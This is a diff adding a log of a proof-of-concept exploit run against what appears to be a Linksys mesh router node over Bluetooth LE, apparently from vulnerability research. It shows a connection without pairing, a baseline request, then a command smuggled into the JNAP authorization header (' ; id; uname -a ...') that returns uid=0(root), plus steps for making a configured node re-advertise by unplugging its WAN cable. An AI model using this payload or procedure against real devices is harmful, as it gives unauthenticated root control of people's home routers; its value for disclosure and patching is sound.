@@ -1,0 +1,15 @@
+21:39:11 === PoC START target=any-2080 cmd='id; uname -a' ===
+21:39:11 If target is a configured Master node: unplug WAN cable ~10s, wait 30-60s for
+21:39:11 btsetup to restart and advertise, then run this script (or keep it scanning).
+21:39:13 sighting 80:69:1A:XX:XX:XX rssi=-14 uuids=['00002080-8eab-46c2-b788-0e9440016fd1']
+21:39:15 CONNECTED (no pairing required - pre-auth surface)
+21:39:16   CHAR 00002082-8eab-46c2-b788-0e9440016fd1 props=['read', 'write']
+21:39:16   CHAR 00002081-8eab-46c2-b788-0e9440016fd1 props=['notify', 'read', 'write']
+21:39:16 [BENIGN] payload=b'X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/StartSmartConnectClient\r\nX-JNAP-Authorization: Basic ********\r\n{ "param": "x" }'
+21:39:17 [BENIGN] DATA+CP written, waiting 6.0s ...
+21:39:23 [BENIGN] readback: bytearray(b'{ "result": "_ErrorUnauthorized", "error": "Invalid authorization credentials \'Basic ********\\u000D\'" }')
+21:39:25 [INJECT] payload=b'X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/StartSmartConnectClient\r\nX-JNAP-Authorization: Basic ********\' ; id; uname -a > /tmp/poc_b1_out 2>&1 ; \'\r\n{ "param": "x" }'
+21:39:26 [INJECT] DATA+CP written, waiting 6.0s ...
+21:39:32 [INJECT] readback: bytearray(b'{ "result": "_ErrorUnauthorized", "error": "Invalid authorization credentials \'Basic ********\'" }uid=0(root) gid=0(root)\n')
+21:39:32 [INJECT] stdout via GATT: 'uid=0(root) gid=0(root)'
+21:39:32 === PoC DONE - success criteria met: uid=0(root) via in-band GATT readback ===
